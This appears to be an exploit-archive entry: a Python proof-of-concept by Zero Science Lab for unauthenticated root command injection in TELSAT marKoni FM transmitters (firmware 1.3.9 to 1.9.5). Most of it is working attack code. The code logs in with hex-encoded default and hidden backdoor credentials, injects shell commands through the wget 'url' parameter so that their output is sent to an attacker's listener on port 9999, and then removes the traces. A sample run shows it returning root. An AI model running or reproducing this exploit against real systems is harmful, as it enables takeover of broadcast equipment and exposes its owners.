@@ -1,0 +1,201 @@
+id: 39290
+date: 01/31/2024
+title: TELSAT marKoni FM Transmitter 1.9.5 Root Command Injection Exploit
+author: LiquidWorm
+cves: 
+
+#!/usr/bin/env python
+#
+#
+# TELSAT marKoni FM Transmitter 1.9.5 Root Command Injection PoC Exploit
+#
+#
+# Vendor: TELSAT Srl
+# Product web page: https://www.markoni.it
+# Affected version: Markoni-D (Compact) FM Transmitters
+#                   Markoni-DH (Exciter+Amplifiers) FM Transmitters
+#                   Markoni-A (Analogue Modulator) FM Transmitters
+#                   Firmware: 1.9.5
+#                             1.9.3
+#                             1.5.9
+#                             1.4.6
+#                             1.3.9
+#
+# Summary: Professional FM transmitters.
+#
+# Desc: The marKoni FM transmitters are susceptible to unauthenticated
+# remote code execution with root privileges. An attacker can exploit
+# a command injection vulnerability by manipulating the Email settings'
+# WAN IP info service, which utilizes the 'wget' module. This allows
+# the attacker to gain unauthorized access to the system with administrative
+# privileges by exploiting the 'url' parameter in the HTTP GET request
+# to ekafcgi.fcgi.
+#
+# -------------------------------------------------------------------------
+# [lqwrm@metalgear ~]# python yp.tiolpxe 10.0.8.3:88 backdoor 10.0.8.69 whoami
+# Authentication successful for backdoor
+# Injecting command: whoami
+# Listening on port 9999
+# ('10.0.8.3', 47302) called back
+# Received: root
+# Housekeeping...
+# Zya and thanks for stopping by!
+#
+# [lqwrm@metalgear ~]# 
+#
+# -------------------------------------------------------------------------
+#
+# Tested on: GNU/Linux 3.10.53 (armv7l)
+#            icorem6solox
+#            lighttpd/1.4.33
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research and Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+#
+#
+# Advisory ID: ZSL-2024-5808
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5808.php
+#
+#
+# 10.11.2023
+#
+
+from colorama import init, Fore
+import re,os,sys,requests
+import socket,threading
+from time import sleep
+init()
+
+def just_listen_to_me(lport, cstop):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lport))
+    s.listen(1)
+    print("Listening on port " + str(lport))
+    try:
+        conn, addr = s.accept()
+        print(addr, "called back")
+        cstop.set()
+    except socket.timeout:
+        print("Call return timeout\nCheck your ports")
+        conn.close()
+    while True:
+        try:
+            odg = conn.recv(1771).decode()
+            uam = re.search(r"User-Agent:\s*(.*)", odg)
+
+            if uam:
+                uav = uam.group(1)
+                print(f"Received: {uav}")
+                exit()
+            else:
+                print("No output for you")
+        except:
+            print("Housekeeping...")
+            exit()
+    s.close()
+
+def authenticate(ipaddr, option): #### Encrypted Shit ####_"
+    auth_url = f"http://{ipaddr}" # oOoOoOoOoOoOoOoOoOoOoOo"
+    ep = "/cgi-bin/ekafcgi.fcgi?OpCode=" ##################"
+    if option == "user": ##################################"
+        username = "\x75\x73\x65\x72" #####################"
+        password = "\x75\x73\x65\x72" #####################"
+    elif option == "admin": ###############################"
+        username = "\x61\x64\x6D\x69\x6E" #################"
+        password = "\x61\x64\x6D\x69\x6E" #################"
+    elif option == "backdoor": ############################"
+        username = "\x66\x61\x63\x74\x6F\x72\x79" #########"
+        password = "\x69\x6E\x6F\x6B\x72\x61\x6D\x32\x35"#_"
+
+    authp = {
+        'username': username,
+        'password': password
+    }
+
+    resp = requests.get(auth_url + ep + "1", params=authp)
+
+    if "Set-Cookie" in resp.headers:
+        print(f"Authentication successful for {option}")
+        auth_cookie = resp.headers["Set-Cookie"].split(";")[0]
+        return auth_cookie
+    else:
+        print(f"Authentication failed for {option}.")
+        print("Try a different option.")
+        return None
+
+def execute(ipaddr, cookie, command, listen_ip):
+    print(f"Injecting command: {command}")
+    ep = "/cgi-bin/ekafcgi.fcgi?OpCode="
+    eden = f"http://{ipaddr}{ep}26&param=wget&ena=1&url=-U%20%60{command}%60%20{listen_ip}:9999"
+    dva = f"http://{ipaddr}{ep}27"
+    tri = f"http://{ipaddr}{ep}26&param=wget&ena=0&url="
+    clear = f"http://{ipaddr}{ep}3&com1=203C%20001001"
+
+    headers = {"Cookie": cookie}
+
+    requests.get(eden, headers=headers)
+    sleep(2)
+    requests.get(dva, headers=headers)
+    sleep(2)
+    requests.get(tri, headers=headers)
+    sleep(1)
+    requests.get(clear, headers=headers)
+    print("Zya and thanks for stopping by!")
+    exit(0)
+
+def njaaah(text):
+    columns = os.get_terminal_size().columns
+    print(text.center(columns))
+
+zsl = "\033[91mWaddup!\033[0m" #Win64
+mrjox = f"""
+     ________
+   /          \\
+  /    ____    \\
+ |   /    0 \\   |
+ |   \\______/   | 
+  \\____________/  {zsl}
+       | |
+      /   \\
+     /  O  \\
+    |    O  \\
+    |       \\
+    |        \\
+    |_________|
+        """
+
+if len(sys.argv) != 5:
+    print()
+    print("This is a PoC script for the marKoni transmitters 0day")
+    print("Usage: python yp.tiolpxe <target_ip:port> <option> <listen_ip> <command>")
+    print("Option: 'user', 'admin', 'backdoor'")
+    print("Default listening port: 9999")
+    njaaah(mrjox)
+    exit()
+
+ipaddr = sys.argv[1]
+opt = sys.argv[2]
+listen_ip = sys.argv[3]
+command = sys.argv[4]
+
+opt_map = {
+    "admin"    : "admin",
+    "user"     : "user",
+    "backdoor" : "backdoor"
+}
+
+if opt in opt_map:
+    auth_cookie = authenticate(ipaddr, opt_map[opt])
+    if auth_cookie:
+        cstop = threading.Event()
+        lt = threading.Thread(target=just_listen_to_me, args=(9999, cstop))
+        lt.start()
+        execute(ipaddr, auth_cookie, command, listen_ip)
+        cstop.set()
+        lt.join()
+else:
+    print("Invalid option.")
+
+#  0day.today [2024-02-02]  #
